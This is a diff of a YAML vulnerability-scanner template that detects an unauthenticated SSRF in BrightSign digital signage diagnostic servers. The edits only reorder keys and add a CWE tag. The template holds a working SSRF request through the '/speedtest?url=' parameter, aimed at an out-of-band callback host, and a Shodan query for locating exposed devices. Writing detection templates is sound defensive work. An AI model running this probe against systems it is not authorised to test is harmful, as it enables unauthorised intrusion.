@@ -1,5 +1,4 @@
 id: brightsign-dsdws-ssrf
-
 info:
   name: BrightSign Digital Signage Diagnostic Web Server 8.2.26 Unauthenticated - SSRF
   author: 0x_Akoko
@@ -8,26 +7,25 @@ info:
   reference:
     - https://brightsign.zendesk.com/hc/en-us/articles/360056180694-Regarding-Advisory-ID-ZSL-2020-5595
     - https://www.zeroscience.mk/codes/brightsign_ssrf.txt
+  classification:
+    cwe-id:
+      - CWE-918
   metadata:
     runzero-review: REJECT/2025-11-07/uses interactsh
-    verified: true
     max-request: 1
     shodan-query: title:"BrightSign"
-  tags: ssrf,brightsign,unauth,vuln
-
+    verified: true
+  tags: brightsign,ssrf,unauth,vuln
 http:
-  - method: GET
+  - matchers:
+      - part: interactsh_protocol
+        type: word
+        words:
+          - http
+      - dsl:
+          - contains(body_1, "Downloaded")
+        type: dsl
+    matchers-condition: and
+    method: GET
     path:
       - '{{BaseURL}}/speedtest?url={{interactsh-url}}'
-
-    matchers-condition: and
-    matchers:
-      - type: word
-        part: interactsh_protocol # Confirms the HTTP Interaction
-        words:
-          - "http"
-
-      - type: dsl
-        dsl:
-          - 'contains(body_1, "Downloaded")'
-
